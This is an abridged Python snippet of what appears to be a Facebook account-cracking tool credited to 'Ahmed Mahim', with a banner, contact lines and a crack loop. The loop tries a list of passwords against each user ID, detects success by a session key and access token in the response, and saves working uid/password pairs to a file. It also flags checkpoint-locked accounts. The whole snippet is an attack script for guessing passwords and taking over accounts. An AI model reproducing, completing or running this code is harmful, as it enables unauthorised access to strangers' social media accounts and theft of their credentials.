...
class Main:
	def __init__(self):
		...
		print("\n  ( Programmed By Ahmed Mahim )") 
		print("\n  ( Facebook : Ahmed Mahim )") 
		print("\n  ( What's app : 018XXXXX )") 
		print(" ( https://github.com/Toxic-Mahim/Random.gi )\n") 
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r [CRACK] %s/%s -> [MAHIM-OK]:-%s - [MAHIM-CP]:-%s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[MAHIM-CP] %s • %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s • %s"%(uid, pw))
				open("OK-"+tgl+".txt","a").write("%s | %s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[MAHIM-CP] %s • %s\033[0;97m         "%(uid, pw))
